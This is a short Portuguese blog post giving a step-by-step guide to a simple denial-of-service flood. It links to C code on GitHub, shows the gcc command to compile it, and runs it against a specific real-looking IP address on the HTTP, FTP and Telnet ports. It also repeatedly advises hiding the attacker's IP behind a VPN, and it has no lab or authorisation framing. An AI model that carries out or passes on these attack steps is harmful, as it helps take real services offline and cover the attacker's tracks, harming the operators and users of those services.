---
title: DoS Attack - with Clang
category: post
---

>link do código usado : 
https://github.com/d0x75/DoS-Clang_Linux.git

---


**Simple DoS Attack**

>DoS é um ataque de negação de serviço que é feito para prejudicar o pilar da Disponibilidade dos dados.

>Nesse caso se trata de um DoS bem simplório, que irá apenas ficar fazendo requisições repetidamente.. afim de sobrecarregar o Host e consequentemente derrubar-lo.



### Step 1

- Configurar uma VM Linux , de preferência com uma VPN para esconder o IP do atacante.

- Ter instalado ao menos o GCC na VM, para compilar o código que vai efetuar o DoS.


### Step 2


- Obter e Ler o código do link mencionado no início.

- Depois de entender e compilar o código mencionado
acima, usando o GCC de forma convencional :


```bash		
gcc DoS-linux.c -o DoS
```

### Step 3

- Se possível ligar uma VPN ou outro mecanismo que
esconda o IP do dispositivo atacante.
	
- Executar o programa compilado no Step 2, e passar
como argumento o 'host' e 'port' do alvo, que ficará
recebendo as requisições até ficar flooded e cair.

_exemplos :_

*Direcionando o DoS para um servidor HTTP(porta 80)* :


```bash
./DoS 65.75.137.94 80
```

*Direcionando o DoS para um servidor FTP(porta 21)* :


```bash
./DoS 65.75.137.94 21
```

*Direcionando o DoS para um servidor Telnet(porta 23)* :


```bash
./DoS 65.75.137.94 23
```